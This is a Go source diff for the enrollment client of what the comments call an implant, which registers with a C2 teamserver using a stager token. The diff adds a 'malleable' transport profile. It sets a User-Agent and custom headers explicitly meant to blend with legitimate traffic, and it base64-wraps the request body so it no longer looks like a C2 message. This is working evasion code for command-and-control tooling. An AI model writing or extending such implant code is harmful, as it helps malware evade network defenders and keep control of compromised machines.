@@ -64,12 +64,50 @@ type Enrollment struct {
 	CAs []*x509.Certificate
 }
 
+// TransportProfile is the malleable wire-shape profile the enroll client applies
+// to the enroll request (architecture.md Sec 7, M4.3). Each field is optional and
+// zero-valued to a no-op: the client enrolls against the given enrollURL as-is,
+// with no custom headers and a raw-JSON body. The caller (main) builds it from
+// the operator/baked profile so c2 stays free of config coupling.
+type TransportProfile struct {
+	// UserAgent is the User-Agent header presented on enroll. Empty omits it.
+	UserAgent string
+	// Headers are extra HTTP headers applied to the enroll request.
+	Headers map[string]string
+	// RequestTimeout is the per-request timeout. Zero means the default (30s).
+	RequestTimeout time.Duration
+	// Envelope is how the enroll JSON body is shaped: EnvelopeNone sends raw
+	// JSON, EnvelopeBase64 wraps it as a single base64 string.
+	Envelope Envelope
+}
+
+// Envelope selects how the enroll JSON body is shaped on the wire.
+type Envelope int
+
+const (
+	// EnvelopeNone sends the enroll body as the raw JSON document.
+	EnvelopeNone Envelope = iota
+	// EnvelopeBase64 wraps the enroll JSON body as a single base64 string so the
+	// request body no longer looks like a structured C2 message.
+	EnvelopeBase64
+)
+
+// DefaultRequestTimeout is the enroll timeout used when a profile does not pin
+// its own (the value the reference implant used before the profile carried one).
+const DefaultRequestTimeout = 30 * time.Second
+
 // Enroll redeems the stager token at the teamserver, sending the implant's own
 // public key, and returns the bound leaf paired with the private key. The
 // implant owns its private key throughout; only the public half crosses the wire
 // (architecture.md Sec 9). serverCAs pins which server identity to accept over
 // the enroll TLS connection (empty trusts the system roots).
-func Enroll(enrollURL, stagerToken string, privateKey *rsa.PrivateKey, serverCAs *x509.CertPool) (*Enrollment, error) {
+//
+// profile shapes the enroll request per the malleable transport profile
+// (architecture.md Sec 7, M4.3): its User-Agent and Headers are set on the
+// request, RequestTimeout bounds the call, and Envelope wraps the JSON body when
+// set to EnvelopeBase64. A zero-value profile leaves the request identical to
+// the un-profiled shape.
+func Enroll(enrollURL, stagerToken string, privateKey *rsa.PrivateKey, serverCAs *x509.CertPool, profile TransportProfile) (*Enrollment, error) {
 	pubDER, err := x509.MarshalPKIXPublicKey(&privateKey.PublicKey)
 	if err != nil {
 		return nil, fmt.Errorf("marshal public key: %w", err)
@@ -83,13 +121,41 @@ func Enroll(enrollURL, stagerToken string, privateKey *rsa.PrivateKey, serverCAs
 		return nil, err
 	}
 
+	// Apply the body envelope: base64 wraps the JSON as a single string so the
+	// request body differs from a raw-JSON enroll (architecture.md Sec 7).
+	payload := raw
+	if profile.Envelope == EnvelopeBase64 {
+		payload = []byte(base64.StdEncoding.EncodeToString(raw))
+	}
+
+	timeout := profile.RequestTimeout
+	if timeout <= 0 {
+		timeout = DefaultRequestTimeout
+	}
 	client := &http.Client{
-		Timeout: 30 * time.Second,
+		Timeout: timeout,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{RootCAs: serverCAs, MinVersion: tls.VersionTLS12},
 		},
 	}
-	resp, err := client.Post(enrollURL, "application/json", bytes.NewReader(raw))
+
+	req, err := http.NewRequest(http.MethodPost, enrollURL, bytes.NewReader(payload))
+	if err != nil {
+		return nil, fmt.Errorf("build enroll request: %w", err)
+	}
+	req.Header.Set("Content-Type", "application/json")
+	// The malleable profile (architecture.md Sec 7, M4.3): a User-Agent blends
+	// the request with legitimate traffic, and custom headers match a known-good
+	// client shape. Set after Content-Type so a profile cannot accidentally drop
+	// it; a profile Header named Content-Type still wins explicitly below.
+	if profile.UserAgent != "" {
+		req.Header.Set("User-Agent", profile.UserAgent)
+	}
+	for name, value := range profile.Headers {
+		req.Header.Set(name, value)
+	}
+
+	resp, err := client.Do(req)
 	if err != nil {
 		return nil, fmt.Errorf("enroll request: %w", err)
 	}
